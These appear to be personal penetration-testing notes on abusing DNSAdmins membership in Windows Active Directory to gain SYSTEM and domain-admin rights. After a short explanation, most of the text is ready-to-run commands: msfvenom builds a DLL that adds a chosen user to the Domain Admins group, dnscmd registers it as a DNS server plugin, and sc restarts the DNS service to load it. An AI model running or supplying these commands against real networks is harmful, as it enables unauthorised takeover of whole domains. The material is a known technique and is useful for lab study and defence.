


Members of DNSAdmins have access to the DNSInformation of the network. The DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The Service runs as `NT AUTHORITY\SYSTEM` so getting access to a user within this membership can be very powerful. its possible to use the inbuilt [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)  to specify a custom path of a plugin DLL of ours.

REMEMBER DO EVERYTHING SERVICE RELATED FROM CMD.EXE **NOT** POWERSHELL


lets create a DLL where it just adds a local administrator user

notes from [[2 DnsAdmins]]

```python
msfvenom -p windows/x64/exec cmd='net group "domain admins" <Owned_User> /add /domain' -f dll -o adduser.dll
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

sc stop dns

sc start dns
```


